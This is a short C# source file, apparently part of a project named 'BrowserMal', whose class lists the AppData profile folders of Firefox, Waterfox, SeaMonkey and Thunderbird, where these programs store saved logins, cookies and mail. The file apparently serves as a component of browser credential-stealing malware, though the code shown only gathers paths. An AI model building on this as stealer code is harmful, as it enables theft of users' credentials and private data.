﻿using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class GeckoBrowserManager
    {
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private readonly List<BrowserModel> _browserModelsList;

        public GeckoBrowserManager() => _browserModelsList = new List<BrowserModel>();

        public void Init()
        {
            _browserModelsList.Add(new BrowserModel("Firefox", Path.Combine(ApplicationData, @"Mozilla\Firefox\Profiles"), ""));
            _browserModelsList.Add(new BrowserModel("Waterfox", Path.Combine(ApplicationData, @"Waterfox\Profiles"), ""));
            _browserModelsList.Add(new BrowserModel("SeaMonkey", Path.Combine(ApplicationData, @"Mozilla\SeaMonkey\Profiles"), ""));
            _browserModelsList.Add(new BrowserModel("Thunderbird", Path.Combine(ApplicationData, @"Thunderbird\Profiles"), ""));
        }

        public List<BrowserModel> GetBrowsers() => _browserModelsList;
    }
}